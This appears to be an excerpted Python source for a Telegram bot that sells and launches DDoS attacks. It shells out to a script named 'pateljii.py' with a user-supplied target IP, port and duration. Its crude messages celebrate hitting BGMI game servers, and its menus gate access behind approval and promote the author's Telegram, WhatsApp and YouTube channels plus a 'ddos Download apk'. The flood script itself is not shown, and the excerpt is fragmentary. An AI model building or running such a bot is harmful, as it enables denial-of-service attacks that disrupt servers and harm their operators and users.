...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"python3 pateljii.py {target_ip} {target_port} {duration}"
    try:
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*Khud Ko APPROVED to de de *", parse_mode='Markdown')
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*😂 Bgmi ki gand maar Di gai hai Successfully https://t.me/patel_ji47 ! 🚀\n\nHost: {target_ip}:{target_port}\nTime: {duration} seconds\nName: {username}*", parse_mode='Markdown')
    except Exception as e:
...
def send_welcome(message):
    ...
    # Create buttons
    btn1 = KeyboardButton("Official channel 🔗")
    btn2 = KeyboardButton("patelji")
    btn3 = KeyboardButton("patelji ddos Download apk")
    btn4 = KeyboardButton("My id👨")
    btn5 = KeyboardButton("Help❔")
    btn6 = KeyboardButton("Apply process 👨‍💻")
    btn7 = KeyboardButton("Free Official YouTube channel 😈")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)

    bot.send_message(message.chat.id, '''*☠️ PATEL JI ☠️
...
def handle_message(message):
    ...
    if message.text == "Official channel 🔗":
        bot.reply_to(message, '''*By  https://t.me/patel_ji47  
         ☠️ PATELJI_47☠️:
         @patelji_47
➖➖➖➖➖➖➖➖➖➖➖➖👍*''', parse_mode='Markdown')
    elif message.text == "patelji":
        bot.reply_to(message, '''*Thank you sir ❤️‍🔥
By @patel_ji47  *''', parse_mode='Markdown')
        attack_command(message)
    elif message.text == "patelji ddos Download apk":
    ...
    elif message.text == "Apply process 👨‍💻":
        bot.reply_to(message, '''*https://youtu.be/4-M6y5SuX0U?si=JP3cVte7Dfl2CDuX
             Official channel 💥
            https://t.me/patel_ji47 *''', parse_mode='Markdown')
    elif message.text == "Free Official YouTube channel 😈":
        bot.reply_to(message, '''*WhatsApp channel 🫵👇👇
Follow the l 𝗣𝗔𝗧𝗘𝗟 𝗷𝗶 𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 🇮🇳 channel on WhatsApp:👇👇 https://whatsapp.com/channel/0029Vai5DlNHrDZf6D88bg2U

Free Official YouTube channel 😈👇👇
https://youtube.com/@patel_ji47_?si=K54cKE54gHI81eCC
